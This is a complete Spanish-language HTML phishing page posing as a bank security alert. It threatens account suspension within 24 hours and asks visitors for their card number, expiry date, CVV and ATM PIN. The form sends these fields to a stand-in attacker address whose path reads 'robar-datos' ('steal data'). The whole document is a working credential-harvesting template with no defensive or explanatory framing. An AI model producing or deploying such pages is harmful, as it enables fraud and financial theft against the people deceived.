<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actualización de Seguridad</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; text-align: center; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #d32f2f; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
        button { background: #d32f2f; color: white; padding: 15px; border: none; width: 100%; font-size: 18px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px;}
        .warning { font-size: 12px; color: #666; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <h2>⚠️ Alerta de Seguridad Bancaria</h2>
    <p>Hemos detectado actividad inusual. Para evitar el bloqueo de sus cuentas, confirme los datos de su tarjeta inmediatamente.</p>

    <form action="http://sistema-banco-falso.com/robar-datos">
        <input type="text" placeholder="Número de Tarjeta (16 dígitos)" required />
        <input type="text" placeholder="Fecha de Vencimiento (MM/AA)" required />
        <input type="password" placeholder="CVV (Código de 3 dígitos)" required />
        <input type="password" placeholder="PIN de Cajero" required />
        <button type="submit">Validar Identidad</button>
    </form>

    <p class="warning">Si no actualiza sus datos en 24 horas, sus cuentas serán suspendidas permanentemente.</p>
</div>
</body>
</html>
